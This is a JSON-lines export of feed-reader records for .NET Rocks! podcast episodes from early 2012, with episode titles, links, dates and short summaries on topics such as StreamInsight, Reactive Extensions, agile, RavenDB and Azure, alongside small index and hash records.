{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=779","title":"J Sawyer Does Complex Event Processing with StreamInsight","published":{"$wrap":"$date","v":1340683200000,"h":"2012-06-26T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to J Sawyer about StreamInsight. Part of the SQL Server platform, StreamInsight is a stand-alone install that allows you to do complex event processing (CEP) applications. Complex Event Processing is a pattern of dealing highly parallel, high velocity data streams to do real-time analysis. J talks about how StreamInsight simplifies CEP handling all the parallelism and memory management for you. The conversation also digs into the relationship between Reactive Extensions and StreamInsight - they compliment each other. This is about taking logging to a whole new level!","author":false,"_id":{"$wrap":"$oid","v":113}}
{"k":"0000000082","o":"0000000587","v":"001"}
{"_id":114,"_uid":114,"_dt":1373728933782,"_s":"3b99fa122ab1aed5f52548a3847cad8d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=778","title":"Paul Betts and Tim Clem Use GitHub with Windows","published":{"$wrap":"$date","v":1340251200000,"h":"2012-06-21T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Paul Betts and Tim Clem of Git about the new GitHub for Windows. GitHub has always been accessible by Windows, but far more Linux friendly. GitHub for Windows addresses this with a standalone client for GitHub. No Visual Studio required!","author":false,"_id":{"$wrap":"$oid","v":114}}
{"k":"0000000082","o":"0000000824","v":"001"}
{"_id":115,"_uid":115,"_dt":1373728933783,"_s":"99ee96ee26c29a4df05942eee8e86609"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=777","title":"Venkat Subramaniam Thinks Functionally","published":{"$wrap":"$date","v":1340078400000,"h":"2012-06-19T04:00:00.000Z"},"starred":false,"read":false,"content":"At NDC Carl and Richard talk to Venkat Subramaniam about functional programming. Venkat digs into the idea that functional programming is less about language and more about practice, exploring how C# can build functional code just as well as F#. The conversation also drills into the advantages of functional programming for parallelism and the specific types of business applications that can benefit from this style of programming. Venkat's enthusiasm makes it hard to resist writing everything functional!","author":false,"_id":{"$wrap":"$oid","v":115}}
{"k":"0000000082","o":"0000000476","v":"001"}
{"_id":116,"_uid":116,"_dt":1373728933784,"_s":"efdba0d64048dc531b50ea27bd598e69"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=776","title":"The State of Agile Panel at NDC","published":{"$wrap":"$date","v":1339646400000,"h":"2012-06-14T04:00:00.000Z"},"starred":false,"read":false,"content":"While at the Norwegian Developers Conference in Oslo, Norway, Carl and Richard moderated a panel of luminaries from the agile world about the state of the agile today.","author":false,"_id":{"$wrap":"$oid","v":116}}
{"k":"0000000082","o":"0000001026","v":"001"}
{"_id":117,"_uid":117,"_dt":1373728933785,"_s":"eda6c34aa1fe5aa5955674fb8dd2ade1"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=775","title":"Stephen Toub Does Parallel Development in Studio 11","published":{"$wrap":"$date","v":1339473600000,"h":"2012-06-12T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Stephen Toub about how the beta of Studio 11 has impacted parallelism. The conversation starts with a solid discussion about the difference between asynchronous, concurrency and parallelism. From there, Stephen talks about how Studio 11 has matured async and await, largely under the hood, to take advantage of more hardware and better concurrency with no additional code. He mentions the ASync Targeting Pack bringing async and await to Silverlight 5. Finally Stephen talks about some of the new instrumentation in Studio 11 to understand how parallelism is working in your application to assist with debugging and performance. Parallelism is moving forward in Studio 11!","author":false,"_id":{"$wrap":"$oid","v":117}}
{"k":"0000000082","o":"0000000821","v":"001"}
{"_id":118,"_uid":118,"_dt":1373728933786,"_s":"2366ab1765e8f43279aa7af32bc0888f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=774","title":"Stephen Bohlen Talks About the Evolution of the Architect","published":{"$wrap":"$date","v":1339041600000,"h":"2012-06-07T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Stephen Bohlen about architecture. The conversation starts with Stephen's work on spring.net and the relationship between Java and .NET. Then Stephen digs into the evolution of architecture, comparing his experience as a 'real' architect designing buildings to building software. He discusses how using the term software engineer is part of what led to the waterfall approach of software development and how agile is fighting back against the term and behavior.","author":false,"_id":{"$wrap":"$oid","v":118}}
{"k":"0000000082","o":"0000001003","v":"001"}
{"_id":119,"_uid":119,"_dt":1373728933787,"_s":"13a08be6532ee2654a76806d0da30e3a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=773","title":"Scott Hunter Goes to ASP.NET 4.5 and Beyond!","published":{"$wrap":"$date","v":1338868800000,"h":"2012-06-05T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard start out talking to Scott Hunter about what's coming up in ASP.NET - but then he goes beyond! The conversation starts out talking about where the .NET Framework as a whole is going - Scott reveals some of the internal discussions they're having about how to evolve the .NET Framework. Scott also talks about Single Page Applications (SPA), which are part of the beta of ASP.NET 4.5 but will not be making the shipping version. SPA will be back in an update to ASP.NET after the Studio 11 ship date. The conversation then goes into some of the features coming in ASP.NET 4.5, including performance features for JavaScript and CSS, as well as implementing OpenAuth.","author":false,"_id":{"$wrap":"$oid","v":119}}
{"k":"0000000082","o":"0000000853","v":"001"}
{"_id":120,"_uid":120,"_dt":1373728933788,"_s":"c571653983bfd61a3ad2d4be3bc70e0d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=772","title":"Dominick Baier Updates Us on Identity in .NET 4.5","published":{"$wrap":"$date","v":1338436800000,"h":"2012-05-31T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard catch up with Dominick Baier to talk about the changes to identity in the 4.5 Framework, Windows 8 and Server 2012. Dominick lets us know that claims-based security is everywhere in 4.5 - built right into the System libraries. No more separate WIF to install! The conversation also digs into the fact that Windows 8 and Server 2012 are rolling claims-based security into Active Directory, making implementation even simpler. Role-based security continues to function, but everything under the hood is a claim.","author":false,"_id":{"$wrap":"$oid","v":120}}
{"k":"0000000082","o":"0000000791","v":"001"}
{"_id":121,"_uid":121,"_dt":1373728933789,"_s":"7f251077110472f24e93dd5df6bbcc2a"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=771","title":"Joel Semeniuk Talks Agile and Lean","published":{"$wrap":"$date","v":1338264000000,"h":"2012-05-29T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Joel Semeniuk about various styles of agile development. The conversation starts with addressing a comment from a listener on dealing with decomposition of user stories so that they fit into sprints and how to manage research spikes. Joel talks about splitting time in sprints between feature building, bug fixing and research. Next the topics of lean and Kanban and how they connect together with agile development. A great refresher on agile practices!","author":false,"_id":{"$wrap":"$oid","v":121}}
{"k":"0000000082","o":"0000000874","v":"001"}
{"_id":122,"_uid":122,"_dt":1373728933791,"_s":"9b89eb2046e224de6aa25144a4ae9cce"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=770","title":"Carl and Richard are Back in Space!","published":{"$wrap":"$date","v":1337832000000,"h":"2012-05-24T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard are back in space! With the SpaceX launch to the International Space Station, the boys decide they have to talk about space again. A big chunk of the conversation focuses on how a billionaire boys club has grown up around space - folks like Elon Musk who made their money in technology are now spending it to expand mankind's reach into space, and perhaps make a buck or two along the way. Beyond SpaceX there is Planetary Resources, a gathering of a bunch of internet billionaries to mine asteroids. Is this how mankind will expand into space?","author":false,"_id":{"$wrap":"$oid","v":122}}
{"k":"0000000082","o":"0000000830","v":"001"}
{"_id":123,"_uid":123,"_dt":1373728933792,"_s":"701110aa2403dae963ccb5dd6c2729a0"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=769","title":"Beth Massi Builds Apps with LightSwitch in Studio 11","published":{"$wrap":"$date","v":1337659200000,"h":"2012-05-22T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Beth Massi about the latest incarnation of LightSwitch. In 2011 LightSwitch shipped as a separate install, but the upcoming version of LightSwitch is part of every SKU of Studio 11. Beth talks about how LightSwitch has evolved to be an awesome consumer and creator of data, making it simple to create oData interfaces over anything. The conversation also digs into the role of Silverlight, the evolution of the client and how LightSwitch makes apps in the cloud much simpler.","author":false,"_id":{"$wrap":"$oid","v":123}}
{"k":"0000000082","o":"0000000703","v":"001"}
{"_id":124,"_uid":124,"_dt":1373728933792,"_s":"3d4895558f0ecbefe1a1913b8b17e530"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=768","title":"Mister Franklin Goes to Washington","published":{"$wrap":"$date","v":1337227200000,"h":"2012-05-17T04:00:00.000Z"},"starred":false,"read":false,"content":"On Sunday, May 6th, Carl went to Washington, DC for a Fly-In at the Association for Competitive Technology (ACT) for the purpose of talking to Senators and Representatives about issues around technology. He also talked to many of the developers and IT people who were attending these meetings, some of whom are regulars on .NET Rocks! This is a very special .NET Rocks! We hope you enjoy it.","author":false,"_id":{"$wrap":"$oid","v":124}}
{"k":"0000000082","o":"0000000414","v":"001"}
{"_id":125,"_uid":125,"_dt":1373728933793,"_s":"d835f857569a8fcfa817cb22020ada94"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=767","title":"Micheal Learned Tours Us Around Studio 11","published":{"$wrap":"$date","v":1337054400000,"h":"2012-05-15T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Micheal Learned about the new ALM features coming in Visual Studio 11.","author":false,"_id":{"$wrap":"$oid","v":125}}
{"k":"0000000082","o":"0000000663","v":"001"}
{"_id":126,"_uid":126,"_dt":1373728933794,"_s":"ad2fab16b8810e908cca747ff8c94382"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=766","title":"Rob Conery Codes in CoffeeScript","published":{"$wrap":"$date","v":1336622400000,"h":"2012-05-10T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to the one-and-only Rob Conery about CoffeeScript. Why would you use a language to generate Javascript? Rob talks about how CoffeeScript is designed to be human readable while JavaScript is much more machine-readable. Indents matter! No curly braces! Dogs and cats living together! It's chaos! But it's a happy chaos. Check it out!","author":false,"_id":{"$wrap":"$oid","v":126}}
{"k":"0000000082","o":"0000000783","v":"001"}
{"_id":127,"_uid":127,"_dt":1373728933795,"_s":"caf15c8f4a59d09027c796c22fae6af2"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=765","title":"Brian Noyes Builds Single Page Applications","published":{"$wrap":"$date","v":1336449600000,"h":"2012-05-08T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Brian Noyes about the Single Page Application (SPA) feature coming in MVC 4. Brian talks about the similarities of the design patterns for SPA to the more classical Silverlight or WPF application with RIA or WCF services on the back end. While hardly new to the web space (SPAs can be traced back to Outlook Web Access circa 2002), SPAs are going to be part of Studio 11. Brian talks through the strengths and weaknesses of the approach.","author":false,"_id":{"$wrap":"$oid","v":127}}
{"k":"0000000082","o":"0000000701","v":"001"}
{"_id":128,"_uid":128,"_dt":1373728933796,"_s":"fc709e8a579f3f89f8ae2c9590254d4c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=764","title":"Catching Up with Ted Neward","published":{"$wrap":"$date","v":1336017600000,"h":"2012-05-03T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard catch up with Ted Neward - it had been too long since he was on! The conversation starts off talking about the maturity of .NET and how unimpressed Ted is with Async and Await. Ted also talks about Javascript and Ruby and the evolution of languages as a whole. Finally, NoSQL makes an appearance with a discussion around the issues of ORM. Has Ted Neward become a grumpy old man?","author":false,"_id":{"$wrap":"$oid","v":128}}
{"k":"0000000082","o":"0000000759","v":"001"}
{"_id":129,"_uid":129,"_dt":1373728933797,"_s":"9f04b742c19a7da71a75356bf67e58ad"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=763","title":"Glenn Block Does node.js on Azure","published":{"$wrap":"$date","v":1335844800000,"h":"2012-05-01T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Glenn Block about node.js on Azure. Glenn digs into how node.js has grown in popularity, and points to the Cloud9 IDE as a development environment in the Cloud as an example of a node.js application - which happens to be able to build node.js applications. And Cloud 9 can deploy node.js to Azure. The conversation digs into the Azure stack and the diversity of technologies (including node.js) that run great in the cloud.","author":false,"_id":{"$wrap":"$oid","v":129}}
{"k":"0000000082","o":"0000000907","v":"001"}
{"_id":130,"_uid":130,"_dt":1373728933798,"_s":"d34222566cc585ad6f1d71ab995319ff"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=762","title":"Carl and Richard Geek Out About Wind Power!","published":{"$wrap":"$date","v":1335412800000,"h":"2012-04-26T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard continue the Geek Out series on alternative energy with wind power. The conversation starts with the admission that as much as has been done with wind power so far, it's just a tiny drop in the bucket of total power consumption - less than 1% of US power comes from wind. Then the boys dig into the different types of wind power generation, the challenges that the power grid has incorporating wind power into the grid, and the kinds of problems that home owners have with wind power also. Wind has potential, but also problems. But long term it's part of the solution.","author":false,"_id":{"$wrap":"$oid","v":130}}
{"k":"0000000082","o":"0000000839","v":"001"}
{"_id":131,"_uid":131,"_dt":1373728933799,"_s":"da8a1a7e16800071ff03ade4356a39f3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=761","title":"Jeroen Hulscher Builds Accessible Web Applications","published":{"$wrap":"$date","v":1335240000000,"h":"2012-04-24T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Jeroen Hulscher about web accessibility. Accessibility challenges come in lots of different forms, and the way we build web pages can make it impossible for some to use your site. Jeroen talks about the tools and techniques to help developers understand what you need to do to make your site easy to use no matter what challenges you might have. As Jeroen says, at some point all of us are going to have some accessibility issues - the web site you make accessible may one day help you!","author":false,"_id":{"$wrap":"$oid","v":131}}
{"k":"0000000082","o":"0000000640","v":"001"}
{"_id":132,"_uid":132,"_dt":1373728933800,"_s":"2d746b714bf042db82fe4870789286e5"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=760","title":"Memory Management with Ricky Leeks","published":{"$wrap":"$date","v":1334808000000,"h":"2012-04-19T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard have a discussion with a vegetable. Yeah, that's right, we interviewed a leek named Ricky Leeks. Beyond all the endless puns, is a great conversation about memory management in .NET. Ricky also lets us know about a free e-book on .NET Memory Management you can download from the links in the show. Check it out!","author":false,"_id":{"$wrap":"$oid","v":132}}
{"k":"0000000082","o":"0000000798","v":"001"}
{"_id":133,"_uid":133,"_dt":1373728933802,"_s":"1894edf39aa8a7311ec160f5f739cd4f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=759","title":"RavenDB on MSNBC!","published":{"$wrap":"$date","v":1334635200000,"h":"2012-04-17T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to John Bennett and Colin Hicks from MSNBC along with Oren Eini about the role RavenDB has played in building applications. John talks about how MSNBC was using SQL Server essentially as a blob store, storing stories as XML documents inside of the database. The conversation digs into the challenges of running a web site with well over a billion page views a month, the impact of breaking news on traffic, and how RavenDB solves the document storage problem effectively for MSNBC.","author":false,"_id":{"$wrap":"$oid","v":133}}
{"k":"0000000082","o":"0000000548","v":"001"}
{"_id":134,"_uid":134,"_dt":1373728933805,"_s":"e2f6afe041416c185a275b3e069982a9"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=758","title":"The State of the Cloud at DevConnections","published":{"$wrap":"$date","v":1334203200000,"h":"2012-04-12T04:00:00.000Z"},"starred":false,"read":false,"content":"Another panel discussion from DevConnections, this one focused on how cloud computing is impacting developers. No holds are barred as the panel digs into virtualization, infrastructure-as-a-service, platform-as-a-service and more.","author":false,"_id":{"$wrap":"$oid","v":134}}
{"k":"0000000082","o":"0000000598","v":"001"}
{"_id":135,"_uid":135,"_dt":1373728933809,"_s":"f6cd8b0b2bc065d6c3251b1516abb877"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=757","title":"Web App Design Shootout at DevConnections","published":{"$wrap":"$date","v":1334030400000,"h":"2012-04-10T04:00:00.000Z"},"starred":false,"read":false,"content":"A panel discussion at DevConnections in Las Vegas digs into different styles of web application development in 2012 - comparing web forms to MVC to the up-and-coming Single-Page style of web app. Carl handles questions from the audience while Richard causes trouble on the panel.","author":false,"_id":{"$wrap":"$oid","v":135}}
{"k":"0000000082","o":"0000000887","v":"001"}
{"_id":136,"_uid":136,"_dt":1373728933811,"_s":"af68f9e7a0f9d4c1dc9ccceddc352ad2"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=756","title":"Bart de Smet has Reactive Extensions","published":{"$wrap":"$date","v":1333598400000,"h":"2012-04-05T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Bart de Smet about the beta of Reactive Extensions (Rx) Version 2. Currently in beta when the show was recorded, Rx 2.0 works with .NET 4.5, both for desktop and metro, as well as Silverlight 5 and Windows Phone 7.1. Bart talks about how Rx lets you write LINQ expressions over top of events, completely changing the way you think about responding to events. If you're tired of cluttering up your UI code with event handlers or you've got a back end process that needs to deal with millions of incoming events, you owe it to yourself to look at Rx!","author":false,"_id":{"$wrap":"$oid","v":136}}
{"k":"0000000082","o":"0000000831","v":"001"}
{"_id":137,"_uid":137,"_dt":1373728933811,"_s":"44139e5e109ca71b9a0da7db2de0cbbb"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=755","title":"Bill Wilder Does Hadoop on Azure","published":{"$wrap":"$date","v":1333425600000,"h":"2012-04-03T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Bill Wilder about Hadoop on Azure. Hadoop is a technology for analyzing massive (petabytes) amount of data efficiently. Originally developed by Yahoo, it was given to the Apache Foundation as an open source project. Google, Facebook and others have all contributed to the project. Microsoft has come late to the game, but with a very compelling offering - you can run Hadoop on Azure and use Visual Studio to work with it. There's lots to learn about Hadoop, this show is just the starting point!","author":false,"_id":{"$wrap":"$oid","v":137}}
{"k":"0000000082","o":"0000000972","v":"001"}
{"_id":138,"_uid":138,"_dt":1373728933812,"_s":"81dc24b94e24abeb4a3625234d332a86"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=754","title":"Carl and Richard Geek Out on Solar Power","published":{"$wrap":"$date","v":1332993600000,"h":"2012-03-29T04:00:00.000Z"},"starred":false,"read":false,"content":"The first of many alternative energy geek outs, Carl and Richard talk about solar power. The boys talk about using solar in the home in the form of thermal as well as photovoltaic, at utility scale with solar thermal, even space-based power. The conversation explores the huge diversity of photovoltaics, including concentrators and quantum dot technologies, the advantages and disadvantages involved. There's also a brief discussion on battery technologies, since solar power doesn't work all that well at night. In the end there aren't easy answers, but things are advancing forward - the amount of solar power being generated these days is increasing!","author":false,"_id":{"$wrap":"$oid","v":138}}
{"k":"0000000082","o":"0000000642","v":"001"}
{"_id":139,"_uid":139,"_dt":1373728933813,"_s":"37aa27d5d95fcb055e338469afacb5ff"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=753","title":"Bryan Hunter and OJ Reeves Program in Erlang","published":{"$wrap":"$date","v":1332820800000,"h":"2012-03-27T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Bryan Hunter and OJ Reeves about programming in Erlang. Erlang is a language built by the telecommunications industry for maximizing concurrency, distribution and reliability. If you're looking to develop applications that take advantage of parallelism, you owe it to yourself to look at Erlang!","author":false,"_id":{"$wrap":"$oid","v":139}}
{"k":"0000000082","o":"0000000815","v":"001"}
{"_id":140,"_uid":140,"_dt":1373728933814,"_s":"e965b827fa2c86eb82adcca69cc53e4b"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=752","title":"The Future of the Web at Prairie DevCon","published":{"$wrap":"$date","v":1332388800000,"h":"2012-03-22T04:00:00.000Z"},"starred":false,"read":false,"content":"While at the Prairie DevCon in Calgary, Carl and Richard moderated a panel discussion on the future of the web with panelists James Kovacs, Andrew Nurse, Bil Simser and James Chambers. The conversation ranged over the quality of web content today and a general push to try and improve it, discussions around monetization, the fragmentation of HTML 5, the role of mobile and some of the cool new technologies coming down the pipe to make the web an even more amazing place to build applications for.","author":false,"_id":{"$wrap":"$oid","v":140}}
{"k":"0000000082","o":"0000000807","v":"001"}
{"_id":141,"_uid":141,"_dt":1373728933815,"_s":"1214c02ebf9439c15c3415abfaf88415"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=751","title":"Mike Diehl Fixes Us Up with Data Quality Services in SQL Server 2012","published":{"$wrap":"$date","v":1332216000000,"h":"2012-03-20T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Mike Diehl about Data Quality Services (DQS) in SQL Server 2012. DQS is a new tool for SQL Server, as Mike points out, Microsoft acquired it. It adds into the suite of tools in SQL Server including Integration Services (SSIS), and Master Data Services. Mike talks about how DQS improves the quality of data by cleansing and de-duplication. Not a typical developer tool, but something any developer working with data needs to know about!","author":false,"_id":{"$wrap":"$oid","v":141}}
{"k":"0000000082","o":"0000000711","v":"001"}
{"_id":142,"_uid":142,"_dt":1373728933816,"_s":"3ee6c775d77e098126a4caa44bd4791f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=750","title":"Steve Rogalsky Maps User Stories","published":{"$wrap":"$date","v":1331784000000,"h":"2012-03-15T04:00:00.000Z"},"starred":false,"read":false,"content":"While at the Prairie DevCon in Calgary, Carl and Richard chatted with Steve Rogalsky about User Story Mapping. Steve explains how User Story Mapping helps with visualizing beyond a serial list of features into categories of features in the product. The conversation also explores how Kanban, Scrum and other techniques work with User Story Mapping, as well as the struggles of using Microsoft Project.","author":false,"_id":{"$wrap":"$oid","v":142}}
{"k":"0000000082","o":"0000000690","v":"001"}
{"_id":143,"_uid":143,"_dt":1373728933817,"_s":"4bdad1daa7d4cab2637dcc26a0e7a9af"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=749","title":"Phil Haack Doesn't Work at Microsoft","published":{"$wrap":"$date","v":1331611200000,"h":"2012-03-13T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Phil Haack about his life after Microsoft. Phil talks about his viewpoint on open source, both software and projects (not the same!). The conversation also digs into how NuGet works in the open source world and Phil's on-going role with it. Finally, Phil talks about his work at GitHub - he's all about making GitHub more appealing to .NET developers.","author":false,"_id":{"$wrap":"$oid","v":143}}
{"k":"0000000082","o":"0000000780","v":"001"}
{"_id":144,"_uid":144,"_dt":1373728933818,"_s":"832ccce47d648fb56611868fcd8ed810"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=748","title":"Tim Huckaby Waves His Hands at Kinect for Windows","published":{"$wrap":"$date","v":1331179200000,"h":"2012-03-08T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Tim Huckaby about his work with the latest version of Kinect, Kinect for Windows. Tim talks about his work building interactive kiosk applications for hotels, airports and the like. Gesture is a huge part of the interactive kiosk applications - and Kinect is at the front. The conversation digs into how Kinect for Windows changes the API dramatically, but opens the door to cool new features like facial and finger recognition.","author":false,"_id":{"$wrap":"$oid","v":144}}
{"k":"0000000082","o":"0000000759","v":"001"}
{"_id":145,"_uid":145,"_dt":1373728933818,"_s":"0087de6cce5231ca512d1bdccdead5c7"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=747","title":"Rob Mensching Does Installations with the WiX Toolset","published":{"$wrap":"$date","v":1331006400000,"h":"2012-03-06T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Rob Mensching about the WiX Toolset, a popular Open Source project for all your software installation needs. How good is WiX Toolset? Visual Studio uses it for installation of itself! Rob talks about different installation solutions and how he eventually came to develop the WiX Toolset as an XML-centric 'set of sets' hierarchy for managing installations. As Rob says, setup development is development!","author":false,"_id":{"$wrap":"$oid","v":145}}
{"k":"0000000082","o":"0000000703","v":"001"}
{"_id":146,"_uid":146,"_dt":1373728933819,"_s":"be89934ccf77f5ec88705a80784a0657"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=746","title":"Juan Campa Programs with XNA","published":{"$wrap":"$date","v":1330574400000,"h":"2012-03-01T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Juan Campa about developing software using XNA. Juan discusses the challenges of building XNA games and shows how his product Gearset makes things simpler. Gearset is available as a Lite edition for free or the Pro edition for $35 USD. The discussion continues into building XNA applications for Windows Phone 7 and what the impact of Windows 8 will be for XNA developers.","author":false,"_id":{"$wrap":"$oid","v":146}}
{"k":"0000000082","o":"0000000707","v":"001"}
{"_id":147,"_uid":147,"_dt":1373728933820,"_s":"b42a4889cfe6bd7d71a1638c4bffbda6"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=745","title":"Jason Kaczor Uses HTML 5 in Sharepoint","published":{"$wrap":"$date","v":1330401600000,"h":"2012-02-28T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Jason Kaczor about developing Sharepoint using HTML 5. Jason discusses the dangers of making web parts and how HTML 5 is a safer, easier solution to customization of Sharepoint. And yes - you can access all the features of Sharepoint using HTML 5. The conversation digs into how you manage your source, do deployments and consider the cloud in your Sharepoint plans.","author":false,"_id":{"$wrap":"$oid","v":147}}
{"k":"0000000082","o":"0000000701","v":"001"}
{"_id":148,"_uid":148,"_dt":1373728933821,"_s":"9299c626d8e7d1605754379fc4e9ccb2"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=744","title":"Keith Brown Does ETL Between RavenDB and SQL Server","published":{"$wrap":"$date","v":1329969600000,"h":"2012-02-23T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Keith Brown of Pluralsight about his work with RavenDB and SQL Server. The topic calls back to earlier conversations about the advantages of using NoSQL technology like RavenDB on the front end of an application and SQL Server on the back end for reporting. This is exactly how Pluralsight works, and Keith explains how the implementation is done.","author":false,"_id":{"$wrap":"$oid","v":148}}
{"k":"0000000082","o":"0000000875","v":"001"}
{"_id":149,"_uid":149,"_dt":1373728933822,"_s":"98b763620018673dd3d901ac24c0acbe"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=743","title":"Derick Bailey Explores JavaScript Frameworks","published":{"$wrap":"$date","v":1329796800000,"h":"2012-02-21T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Derick Bailey about JavaScript in general and JavaScript frameworks specifically. The conversation starts out with a discussion about the state of JavaScript in general, discussing the recent popularity of Node.js. Derick then digs into Backbone.js and how it works with jQuery to keep things far more organized. He also discusses utilizing MongoDB and RavenDB from JavaScript using JSON as the communication path. The discussion ends with some looks at the future of JavaScript in Windows 8 and the next generation of browsers.","author":false,"_id":{"$wrap":"$oid","v":149}}
{"k":"0000000082","o":"0000000614","v":"001"}
{"_id":150,"_uid":150,"_dt":1373728933823,"_s":"8274b9c8674a1cce36433d4bf9f18f5b"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=742","title":"Carl and Richard Geek Out With SmartGrids","published":{"$wrap":"$date","v":1329364800000,"h":"2012-02-16T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard Geek Out about SmartGrids! This show picks up where the Electricity show leaves off. Smart Grid technology is a somewhat loaded term for evolving the one-way dumb electricity grid into a smart, two-way system that can reduce the load on the grid and save money at the same time.","author":false,"_id":{"$wrap":"$oid","v":150}}
{"k":"0000000082","o":"0000000708","v":"001"}
{"_id":151,"_uid":151,"_dt":1373728933824,"_s":"96531879f62ba044821c7f16c06ab994"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=741","title":"Clemens Vasters is Still on the Service Bus","published":{"$wrap":"$date","v":1329192000000,"h":"2012-02-14T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Richard talk to Clemens Vasters about his work on the service bus. These days the service bus is called the Windows Azure Service Bus - part of Azure. Clemens talks about how the service bus makes building reliable applications easier as well as how making the service bus free for a few months has driven traffic up to record levels and the challenges that brought to the team.","author":false,"_id":{"$wrap":"$oid","v":151}}
{"k":"0000000082","o":"0000000645","v":"001"}
{"_id":152,"_uid":152,"_dt":1373728933825,"_s":"e5fad66eef7cd5d94f53293937c64f91"}
